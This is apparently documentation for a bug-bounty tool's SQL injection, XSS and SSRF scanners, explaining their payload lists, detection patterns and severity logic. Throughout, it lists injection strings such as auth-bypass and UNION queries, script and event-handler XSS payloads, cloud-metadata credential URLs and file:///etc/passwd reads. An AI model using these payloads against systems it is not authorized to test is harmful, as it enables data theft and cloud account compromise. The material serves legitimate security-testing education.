# 🔴 Vulnerability Scanners

Deep dive into SQLi, XSS, and SSRF scanners.

---

## 📄 src/sqli_scanner.py - SQL Injection Scanner

### Overview

```python
"""
SQL Injection Scanner Module

Basic SQLi detection through error-based testing:
- Error-based SQLi detection
- Time-based blind SQLi detection
- Common injection points

WHY SQLI SCANNING?
SQL injection is still one of the most critical vulnerabilities:
- Database access
- Data theft
- Authentication bypass
- Remote code execution (in some cases)
"""
```

**SQLi Impact:**
- Read entire database
- Modify/delete data
- Bypass authentication
- Sometimes execute system commands

---

### Payloads

```python
self.error_payloads = [
    "'",                      # Single quote - breaks SQL strings
    "''",                     # Double single quote
    '"',                      # Double quote
    '`',                      # Backtick (MySQL)
    "' OR '1'='1",           # Classic always-true condition
    "' OR '1'='1' --",       # With comment to ignore rest
    "' OR '1'='1' #",        # MySQL comment
    "1' ORDER BY 1--",       # Column enumeration
    "1' ORDER BY 10--",      # Find column count
    "1 AND 1=1",             # Boolean true
    "1 AND 1=2",             # Boolean false (compare responses)
    "admin'--",              # Auth bypass
    "') OR ('1'='1",         # Parenthesis escape
    "1; SELECT 1",           # Stacked queries
    "1 UNION SELECT NULL",   # UNION injection
]
```

**Why these specific payloads?**

| Payload | Purpose |
|---------|---------|
| `'` | Break string, trigger error |
| `' OR '1'='1` | Always true, return all rows |
| `--` | SQL comment, ignore rest of query |
| `ORDER BY` | Find number of columns |
| `UNION SELECT` | Extract data from other tables |
| `admin'--` | Bypass login (username='admin'--') |

---

### Error Patterns

```python
self.error_patterns = [
    # MySQL
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"check the manual that corresponds to your MySQL",
    
    # PostgreSQL
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_",
    
    # Microsoft SQL Server
    r"Driver.* SQL[\-\_\ ]*Server",
    r"Unclosed quotation mark after the character string",
    
    # Oracle
    r"\bORA-[0-9][0-9][0-9][0-9]",
    
    # SQLite
    r"SQLite\.Exception",
    r"\[SQLITE_ERROR\]",
    
    # Generic
    r"SQL syntax",
    r"You have an error in your SQL syntax",
]
```

**Why detect database type?**
- Different databases = different exploitation techniques
- MySQL uses `#` for comments, MSSQL uses `--`
- Knowing the database helps craft better payloads

---

### Time-Based Detection

```python
self.time_payloads = [
    "1' AND SLEEP(3)--",                           # MySQL
    "1' AND BENCHMARK(5000000,SHA1('test'))--",    # MySQL alternative
    "1'; WAITFOR DELAY '0:0:3'--",                 # MSSQL
    "1' AND pg_sleep(3)--",                        # PostgreSQL
]
```

**How time-based works:**
1. Inject `SLEEP(3)` payload
2. If vulnerable, response takes 3+ seconds
3. If not vulnerable, response is fast

**Why time-based?**
- Works when errors are hidden
- "Blind" SQLi - no visible output
- Slower but catches more vulns

```python
async def test_time_based(self, session, url, param, original_value):
    start = time.time()
    async with session.get(test_url, timeout=15) as resp:
        await resp.text()
    elapsed = time.time() - start
    
    if elapsed > 2.5:  # Response took > 2.5 seconds
        return {'type': 'time_based', 'delay': elapsed}
```

**Why 2.5 second threshold?**
- SLEEP(3) should cause 3+ second delay
- 2.5 accounts for network latency
- False positives if server is just slow

---

### Scanning Logic

```python
async def scan_url(self, session, url):
    parsed = urlparse(url)
    if not parsed.query:
        return []  # No parameters to test
    
    query_params = parse_qs(parsed.query)
    
    for param, values in query_params.items():
        # Test error-based first (fast)
        result = await self.test_parameter(session, url, param, original_value)
        if result:
            findings.append(result)
            continue  # Found vuln, skip time-based
        
        # Test time-based (slow, only if error-based didn't find anything)
        result = await self.test_time_based(session, url, param, original_value)
```

**Why error-based first?**
- Fast (instant response)
- If found, no need for slow time-based
- Time-based only as fallback

---

## 📄 src/xss_scanner.py - Cross-Site Scripting Scanner

### Overview

```python
"""
XSS (Cross-Site Scripting) Scanner Module

WHY XSS SCANNING?
XSS allows attackers to:
- Steal session cookies
- Perform actions as the victim
- Redirect users to malicious sites
- Deface websites
"""
```

---

### Payloads

```python
self.payloads = [
    # Basic script tags
    f'<script>alert("{self.canary}")</script>',
    f'<ScRiPt>alert("{self.canary}")</ScRiPt>',  # Case variation
    
    # Event handlers (bypass script tag filters)
    f'<img src=x onerror=alert("{self.canary}")>',
    f'<svg onload=alert("{self.canary}")>',
    f'<body onload=alert("{self.canary}")>',
    f'<input onfocus=alert("{self.canary}") autofocus>',
    
    # Breaking out of attributes
    f'"><script>alert("{self.canary}")</script>',
    f"'><script>alert('{self.canary}')</script>",
    
    # Breaking out of JS strings
    f"';alert('{self.canary}');//",
    f'";alert("{self.canary}");//',
]
```

**Why canary?**
```python
self.canary = "XSS7331"
```
- Unique identifier in our payloads
- Easy to search in response
- Confirms OUR payload was reflected

**Payload categories:**

| Type | Example | Bypasses |
|------|---------|----------|
| Script tag | `<script>alert(1)</script>` | Basic filter |
| Event handler | `<img onerror=alert(1)>` | Script tag filter |
| Case variation | `<ScRiPt>` | Case-sensitive filter |
| Attribute break | `"><script>` | Attribute context |
| JS string break | `';alert(1);//` | JavaScript context |

---

### Reflection Analysis

```python
def analyze_reflection(self, response_text, payload):
    result = {
        'reflected': False,
        'encoded': False,
        'context': None,
        'dangerous': False
    }
    
    # Check if canary is in response
    if self.canary not in response_text:
        return result
    
    result['reflected'] = True
    
    # Check if HTML encoded
    if html.escape(self.canary) in response_text:
        result['encoded'] = True
        return result  # Encoded = safe
```

**Why check encoding?**
- `<script>` → `&lt;script&gt;` = safe (won't execute)
- `<script>` → `<script>` = dangerous (will execute)
- Encoded reflection is NOT a vulnerability

**Context detection:**
```python
    if '<script' in context.lower():
        result['context'] = 'javascript'
        result['dangerous'] = True
    elif 'href=' in context.lower():
        result['context'] = 'attribute'
        result['dangerous'] = True
    elif '<' in context and '>' in context:
        result['context'] = 'html'
        result['dangerous'] = True
```

**Why context matters?**
- HTML context: `<div>USER_INPUT</div>` → need `<script>`
- Attribute context: `<a href="USER_INPUT">` → need `">`
- JS context: `var x = "USER_INPUT"` → need `";`

---

### Scanning Strategy

```python
async def test_parameter(self, session, url, param, original_value):
    # First, test simple reflection
    for test in self.reflection_tests:
        # Send canary
        # Check if reflected unencoded
        
        if analysis['reflected'] and not analysis['encoded']:
            # Reflection found! Now test actual payloads
            for payload in self.payloads[:10]:
                # Send payload
                # Check for dangerous patterns
```

**Two-phase approach:**
1. **Phase 1:** Test if input is reflected at all
2. **Phase 2:** If reflected, test actual XSS payloads

**Why two phases?**
- Most parameters don't reflect input
- Skip payload testing on non-reflecting params
- Much faster scanning

---

## 📄 src/ssrf_scanner.py - Server-Side Request Forgery Scanner

### Overview

```python
"""
SSRF (Server-Side Request Forgery) Scanner

WHY SSRF?
SSRF is a critical vulnerability that allows attackers to:
- Access internal services (databases, admin panels)
- Read cloud metadata (AWS/GCP/Azure credentials)
- Port scan internal networks
- Bypass firewalls and access controls

This is where BIG bounties are - $10k+ for cloud metadata access.
"""
```

**SSRF = Server makes request on attacker's behalf**

Normal: User → Server → External API
SSRF: User → Server → Internal Service (shouldn't be accessible!)

---

### Vulnerable Parameters

```python
self.ssrf_params = [
    'url', 'uri', 'path', 'dest', 'redirect', 'continue',
    'next', 'data', 'reference', 'site', 'html', 'val',
    'domain', 'callback', 'return', 'page', 'feed', 'host',
    'port', 'to', 'out', 'view', 'dir', 'show', 'open',
    'file', 'document', 'folder', 'img', 'filename', 'image',
    'image_url', 'pic', 'src', 'source', 'link', 'href',
    'api', 'api_url', 'endpoint', 'proxy', 'request',
    'fetch', 'load', 'read', 'target', 'resource', 'content',
]
```

**Why these parameters?**
- Commonly used for URL fetching
- `url=`, `src=`, `image_url=` often fetch external resources
- If server fetches URL, might be vulnerable

---

### Payloads

```python
self.payloads = {
    'localhost': [
        'http://localhost/',
        'http://127.0.0.1/',
        'http://[::1]/',                # IPv6 localhost
        'http://0.0.0.0/',
        'http://127.1/',                # Short form
        'http://2130706433/',           # Decimal IP
        'http://0x7f000001/',           # Hex IP
    ],
```

**Why so many localhost variations?**
- Filters might block `localhost` but not `127.0.0.1`
- Might block `127.0.0.1` but not `127.1`
- Decimal/hex bypass string-based filters

```python
    'cloud_metadata': [
        # AWS
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        # GCP
        'http://metadata.google.internal/computeMetadata/v1/',
        # Azure
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    ],
```

**Why cloud metadata is CRITICAL:**
- `169.254.169.254` is cloud metadata service
- Contains AWS keys, GCP tokens, Azure credentials
- Access = full cloud account compromise
- **$10,000+ bounties**

```python
    'protocol_smuggling': [
        'file:///etc/passwd',
        'file:///c:/windows/win.ini',
        'dict://localhost:11211/stats',
        'gopher://localhost:6379/_INFO',
    ],
```

**Protocol smuggling:**
- `file://` - read local files
- `dict://` - interact with memcached
- `gopher://` - interact with Redis, SMTP, etc.

---

### Success Indicators

```python
self.success_indicators = {
    'localhost': ['root:', 'localhost', '127.0.0.1'],
    'cloud_metadata': [
        'ami-id', 'instance-id', 'security-credentials',
        'computeMetadata', 'access_token',
    ],
    'file_read': ['root:x:', '[extensions]'],
}
```

**How we detect success:**
- Response contains internal data
- `root:x:0:0:` = /etc/passwd content
- `ami-id` = AWS metadata
- `access_token` = cloud credentials

---

### Severity Levels

```python
def get_severity(self, category):
    severity_map = {
        'cloud_metadata': 'critical',   # Full cloud compromise
        'file_read': 'critical',        # Read any file
        'localhost': 'high',            # Internal service access
        'internal_networks': 'high',    # Network access
        'protocol_smuggling': 'high',   # Protocol abuse
        'bypass_techniques': 'medium',  # Potential bypass
    }
```

**Why these severities?**
- Cloud metadata = account takeover = CRITICAL
- File read = sensitive data = CRITICAL
- Localhost access = internal services = HIGH
- Bypass techniques = needs verification = MEDIUM

---

## 🎯 Scanner Comparison

| Scanner | Detects | Severity | Speed |
|---------|---------|----------|-------|
| SQLi | Database injection | Critical | Medium |
| XSS | Script injection | High | Fast |
| SSRF | Internal access | Critical | Slow |

**When to use each:**
- SQLi: Forms, search, login pages
- XSS: Any user input reflected in page
- SSRF: URL parameters, image fetchers, webhooks

---

## ⚠️ Important Notes

1. **These are BASIC scanners** - for thorough testing:
   - SQLi → Use sqlmap
   - XSS → Manual testing with browser
   - SSRF → Use Burp Collaborator

2. **False positives happen** - always verify manually

3. **Rate limiting** - scanners use semaphores to avoid overwhelming targets

4. **Legal** - only scan authorized targets!
